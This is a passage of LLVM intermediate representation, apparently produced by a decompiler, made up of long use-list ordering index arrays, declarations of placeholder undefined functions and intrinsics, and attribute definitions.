913, 537, 914, 538, 915, 539, 916, 917, 919, 294, 295, 918, 406, 74, 129, 417, 920, 296, 19, 921, 1068, 1069, 980, 540, 981, 983, 297, 984, 985, 986, 987, 988, 989, 990, 299, 298, 991, 541, 992, 542, 993, 543, 982, 994, 418, 997, 544, 998, 751, 545, 995, 996, 546, 1018, 304, 303, 721, 184, 722, 302, 301, 300, 398, 407, 1012, 1013, 1014, 1015, 1016, 1017, 397, 1019, 1020, 75, 1021, 305, 547, 145, 1051, 1052, 1053, 1054, 401, 1055, 1056, 1057, 400, 1058, 1059, 1060, 1061, 306, 1062, 1064, 1063, 185, 186, 307, 399, 309, 308, 1065, 310, 311, 109, 312, 315, 1070, 1071, 1072, 1073, 314, 313, 316, 1074, 1075, 76, 77, 194, 149, 317, 110, 549, 1076, 1077, 1078, 1079, 1080, 318, 1081, 1082, 453, 1083, 1084, 1085, 1086, 322, 319, 320, 321, 1087, 1088, 1089, 1090, 1091, 1092, 452, 1093, 548, 1094, 451, 1095, 550, 1096, 324, 1098, 1099, 1100, 1101, 323, 325, 1102, 1103, 78, 79, 138, 1104, 326, 1105, 1106, 456, 1107, 454, 1108, 455, 1109, 330, 1111, 1112, 1113, 1114, 329, 328, 331, 1115, 1116, 80, 81, 1110, 327, 1117, 1118, 332, 1119, 1120, 459, 1121, 458, 1122, 457, 1123, 551, 1124, 553, 139, 82, 1125, 187, 460, 554, 1126, 1127, 333, 334, 1128, 552, 1129, 337, 1130, 1131, 1132, 1133, 336, 335, 338, 1134, 1135, 83, 84, 188, 1136, 1137, 20, 21, 22, 23, 1138, 1139, 339, 462, 1140, 555, 1141, 556, 1142, 557, 1143, 558, 1144, 559, 1145, 560, 1146, 461, 1147, 343, 1149, 1150, 1151, 1152, 341, 340, 344, 1153, 1154, 85, 86, 1148, 342, 1156, 1155, 24, 25, 26, 27, 1157, 345, 1158, 1159, 464, 1160, 561, 1161, 562, 1162, 563, 1163, 564, 1164, 565, 1165, 566, 1166, 463, 1167, 567, 1168, 349, 1170, 1171, 1172, 1173, 347, 346, 350, 1174, 1175, 87, 88, 1169, 348, 1176, 89, 568, 1177, 1179, 1180, 1181, 1182, 569, 1183, 28, 29, 30, 31, 32, 1178, 351, 1184, 1185, 470, 1186, 469, 1187, 468, 1188, 467, 1189, 465, 1190, 466, 1191, 570, 1192, 355, 1198, 1199, 1200, 1201, 353, 352, 356, 1202, 1203, 90, 91, 1197, 354, 1204, 92, 571, 1205, 1207, 1208, 1209, 1210, 572, 1211, 33, 34, 35, 36, 37, 1206, 357, 1212, 1213, 472, 1214, 471, 1215, 573, 1216, 575, 140, 93, 1222, 189, 473, 576, 577, 1223, 1224, 358, 359, 1225, 574, 1228, 1229, 1230, 361, 362, 1231, 1232, 94, 1226, 1227, 360, 1234, 1233, 1235, 363, 1236, 1237, 476, 1238, 475, 1239, 474, 1240, 578, 1241, 1248, 1249, 1250, 365, 366, 367, 1252, 1253, 95, 1251, 1247, 364, 1255, 1256, 1254, 1257, 368, 1258, 1259, 479, 1260, 478, 1261, 477, 1262, 579, 1263, 419, 1271, 1281, 369, 1282, 1289, 370, 1290, 1340, 151, 1341, 1342, 420, 580, 402, 1343, 1344, 47, 408, 1345, 1346, 581, 1371, 371, 1372, 1621, 480, 752, 481, 482, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636 }
  uselistorder i32* @r4, { 85, 849, 850, 851, 852, 853, 871, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 10, 868, 869, 870, 872, 873, 874, 875, 876, 877, 878, 879, 92, 93, 94, 95, 138, 11, 139, 140, 141, 12, 142, 143, 144, 145, 146, 147, 148, 0, 13, 149, 150, 151, 152, 153, 154, 155, 156, 215, 216, 880, 86, 87, 88, 882, 883, 884, 5, 887, 56, 881, 766, 767, 96, 97, 98, 99, 100, 101, 102, 103, 104, 888, 889, 157, 158, 14, 4, 159, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 15, 160, 161, 162, 163, 164, 165, 166, 167, 186, 16, 187, 188, 168, 169, 171, 17, 172, 175, 18, 176, 177, 19, 178, 179, 20, 180, 181, 21, 182, 183, 22, 184, 52, 185, 170, 189, 23, 190, 191, 192, 193, 194, 195, 196, 173, 174, 89, 90, 91, 105, 106, 107, 108, 24, 109, 25, 26, 110, 111, 112, 113, 114, 115, 116, 121, 122, 27, 123, 124, 28, 125, 126, 29, 127, 128, 30, 129, 130, 31, 131, 132, 32, 133, 134, 117, 118, 119, 120, 135, 136, 137, 197, 198, 199, 33, 200, 201, 202, 34, 203, 204, 205, 206, 207, 208, 50, 209, 210, 211, 212, 213, 214, 217, 218, 219, 220, 371, 221, 885, 886, 831, 832, 833, 834, 835, 836, 730, 731, 372, 373, 906, 907, 908, 771, 772, 55, 911, 51, 912, 913, 914, 930, 932, 933, 934, 931, 915, 920, 928, 929, 909, 921, 922, 923, 924, 57, 58, 59, 60, 837, 838, 6, 35, 839, 36, 840, 841, 842, 916, 917, 843, 76, 77, 78, 79, 80, 81, 910, 918, 919, 222, 223, 224, 225, 773, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 37, 791, 792, 793, 794, 774, 775, 776, 777, 778, 732, 733, 734, 735, 736, 737, 738, 739, 740, 38, 741, 742, 743, 744, 745, 746, 747, 748, 749, 795, 817, 818, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 53, 809, 810, 1, 811, 812, 813, 814, 815, 816, 245, 246, 247, 698, 699, 700, 701, 702, 705, 706, 707, 703, 704, 654, 655, 656, 657, 658, 659, 660, 605, 606, 607, 610, 611, 612, 608, 609, 248, 249, 250, 251, 252, 253, 254, 255, 256, 661, 662, 663, 664, 665, 666, 667, 61, 257, 258, 259, 260, 261, 262, 263, 374, 375, 376, 377, 378, 379, 380, 226, 227, 228, 381, 382, 383, 384, 9, 385, 386, 387, 62, 388, 389, 390, 391, 264, 265, 266, 269, 270, 271, 267, 268, 272, 273, 274, 275, 276, 277, 925, 926, 927, 278, 279, 280, 392, 393, 394, 395, 396, 281, 282, 283, 455, 456, 414, 415, 74, 75, 284, 285, 286, 287, 65, 66, 63, 64, 67, 68, 69, 70, 71, 72, 73, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 306, 307, 308, 309, 316, 317, 318, 319, 320, 7, 310, 311, 312, 313, 314, 315, 302, 303, 304, 305, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 708, 709, 416, 417, 418, 419, 420, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 340, 341, 342, 343, 344, 345, 82, 83, 334, 335, 336, 337, 338, 339, 346, 347, 348, 349, 350, 351, 352, 54, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 397, 398, 8, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 39, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 2, 494, 495, 496, 497, 498, 499, 500, 501, 40, 502, 41, 503, 42, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 43, 528, 44, 529, 45, 530, 46, 531, 532, 533, 534, 47, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 48, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 49, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 668, 669, 670, 3, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 768, 769, 770, 819, 820, 823, 821, 822, 824, 825, 826, 827, 828, 829, 830, 844, 845, 846, 847, 84, 848 }
}

declare i32 @__libc_errno() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i16* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16 @__decompiler_undefined_function_3() local_unnamed_addr

declare i8* @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #2

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
attributes #2 = { noreturn nounwind }
